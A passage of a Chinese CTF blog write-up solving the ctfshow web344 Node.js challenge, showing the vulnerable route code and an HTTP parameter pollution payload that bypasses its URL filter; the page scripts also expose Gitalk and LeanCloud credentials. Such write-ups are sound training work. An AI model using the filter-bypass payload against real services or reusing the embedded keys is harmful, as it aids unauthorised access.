+<p>emmm 有点不懂这个 <code>JSON.stringify(req.body).match(/Text/ig)</code> 过滤有啥意义就是了。。</p>
+<p>和web342一样的EXP</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135724797-e3a69e4c-e35c-45cb-8b3b-f009b7bf5875.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135724797-e3a69e4c-e35c-45cb-8b3b-f009b7bf5875.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135705117-aeeaaedf-c741-4609-b7b8-6deeeb29c7ae.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135705117-aeeaaedf-c741-4609-b7b8-6deeeb29c7ae.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<h2 id="web344-HPP"><a href="#web344-HPP" class="headerlink" title="web344 HPP"></a>web344 HPP</h2><p>代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.url.match(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="built_in">JSON</span>.parse(req.query.query);</span><br><span class="line">  <span class="keyword">if</span>(query.name===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="literal">true</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>即 url 中不能包含大小写 <code>8c</code>、<code>2c</code> 和 <code>逗号</code></p>
+<p>先构造一个正常请求</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现题目会过滤掉逗号，尝试 URL 编码， <code>urlencode(&quot;,&quot;) = %2c</code> 发现 <code>2c</code> 也被过滤</p>
+<p>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的，下面链接列举了一些</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p>
+<p>nodejs 会把同名参数以数组的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620111020476-d1326765-9e08-4ca0-91a0-843108b9d1a7.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620111020476-d1326765-9e08-4ca0-91a0-843108b9d1a7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>因此构造</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里把 c进行url编码，是因为 双引号 的url编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620110431999-899531ed-35db-4397-b93a-2e8bbee72029.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620110431999-899531ed-35db-4397-b93a-2e8bbee72029.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<hr>
+<p><strong>一些参考的题解</strong></p>
+<div class="note link green"><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/111669500">https://blog.csdn.net/solitudi/article/details/111669500</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832">https://blog.csdn.net/miuzzx/article/details/111780832</a></p></div>
+
+<div class="note link green"><p><a target="_blank" rel="noopener" href="http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d">http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d</a></p></div>
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://tari.moe/2021/05/04/ctfshow-nodejs/>https://tari.moe/2021/05/04/ctfshow-nodejs/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctfshow/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctfshow</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf%E7%BB%83%E4%B9%A0/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf练习</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/04/26/xssrf/'>
+          <p class='title'>XSS & SSRF组合拳<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>去年实习中就遇到一个场景，用 xss 去打 redis，想着刷刷靶场练习一下，然后就在收藏夹吃了一年的灰了。。
+https://xssrf.hackme.inndy.tw/
+即下面链接的 38 ...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="gitalk-container"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web334-JS-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-text">web334 JS 大小写特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web335-RCE"><span class="toc-text">web335 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web336-RCE-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-text">web336 RCE 黑名单绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web337-md5%E7%BB%95%E8%BF%87"><span class="toc-text">web337 md5绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web339-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web339 原型链污染 +</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web340-%E5%8E%9F%E5%9E%8B%E8%BF%9E%E6%B1%A1%E6%9F%93"><span class="toc-text">web340 原型连污染 ++</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web341-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web341 原型链污染 +++</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web342-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web342 原型链污染 ++++</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web343-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web343 原型链污染 +++++</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web344-HPP"><span class="toc-text">web344 HPP</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="ctfshow-nodejs";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        
+          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
+</div>
+        
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2021 TARI TARI</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/issues.min.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  function pjax_gitalk() {
+    if(!document.querySelectorAll("#gitalk-container")[0])return;
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (document.getElementById('gitalk-container') != null) {
+      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tari0510.github.io","owner":"TARI0510","admin":["TARI0510"],"path":null}, {
+	  id: path,
+	  distractionFreeMode: false  // Facebook-like distraction free mode
+    }));
+      gitalk.render('gitalk-container');
+    }
+  }
+  $(function () {
+    pjax_gitalk();
+  });
+  volantis.pjax.push(pjax_gitalk);
+</script>
+
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/app.min.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/search/hexo.min.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
+    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://tari.moe' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
